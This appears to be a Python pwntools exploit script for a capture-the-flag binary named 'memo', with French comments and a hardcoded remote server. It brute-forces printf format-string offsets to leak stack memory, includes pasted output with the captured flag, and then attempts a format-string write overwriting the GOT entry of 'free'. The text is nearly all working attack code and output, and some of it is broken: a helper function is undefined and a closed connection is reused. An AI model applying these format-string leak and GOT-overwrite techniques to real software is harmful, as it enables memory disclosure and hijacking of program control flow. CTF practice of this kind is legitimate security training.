#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='memo'
TIME=0.02
if (len(sys.argv)>1):
    elf=ELF(binaire)
#    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    host='localhost'
    port=59994
else:
    elf=ELF(binaire)
#    libc=ELF('../libc-amd64.so.6')
    host='89.38.210.128'
    port=31339

i=1
while(1):
    try:
        p=remote(host,port)
        p.sendline('%'+str(i)+'$s')
        p.recvuntil("reen?")
        p.sendline("42")
        p.recvuntil("reen?")
        p.sendline("77")
        p.recvuntil("reen?")
        p.sendline("111")
        b=p.recvuntil("Bye!")
        b=b[b.index("good memory")+len("good memory"):]
        b=b[:b.index("\n")]
        print b
        p.close()
        i=i+1
    except:
        p.close()
        i=i+1
'''
francois@aramis:~/BFF/Timisoara/Memo$ python payload.py  SILENT
 You have a very good memory n? 
 
 H=���s1�H\x83�\xfe�
 
 g5d\xb4\x7f
 Let's play
 Your name? > 
 (null)
 (null)
 \xa0\x8c\h
 (null)
 (null)
 (null)
 UH\x89�H�� H\xbf%\x13@
 UH\x89�H�� H\xbf%\x13@
 UH\x89�H�� H\xbf%\x13@
 1�I��^H\x89�H���PTI���@
 timctf{t0_4rr1ve_4t_th3_s1mple_is_d1ff1cult}
 (null)
 AWAVA\x89\xffAUATL\x8d%\x86\x0c 
 \x89����
 @\x8f\x80=�
 UH\x89�H��
 (null)
 1�I��^H\x89�H���PTI���@
 
 (null)
 (null)
 (null)
 (null)
 (null)
 Eo�%�
 
 �\x1f
 (null)
 (null)
 1�I��^H\x89�H���PTI���@
'''  

    





print hex(elf.got['free'])
# la pile est à l'offset 20
#print hex(libc.sym['free']),'->',hex(libc.sym['printf'])," ou ",hex(libc.sym['puts'])
ch=lchaine([0x40eb2 & 0xffff],20,8)+p64(elf.got['free'])
print "lg:",len(ch)

p=remote(host,port)
p.sendline(ch)
#p.sendline(lchaine([0xeb & 0xffff],20,8)+p64(elf.got['exit']))
p.send("\n")
p.recvuntil("reen?")
p.sendline("42")
p.recvuntil("reen?")
p.sendline("77")
p.recvuntil("reen?")
p.sendline("111")
b=p.recvall(2)
print b
p.close()
#p.sendline(lchaine([0xb00 & 0xffff],20,8)+p64(elf.got['exit']))
p.send("\n")
p.recv(128)
time.sleep(1)
p.sendline("42")
time.sleep(1)
p.sendline("77")
time.sleep(1)
p.sendline("111")

time.sleep(1)
b=p.recv(65536)
print b
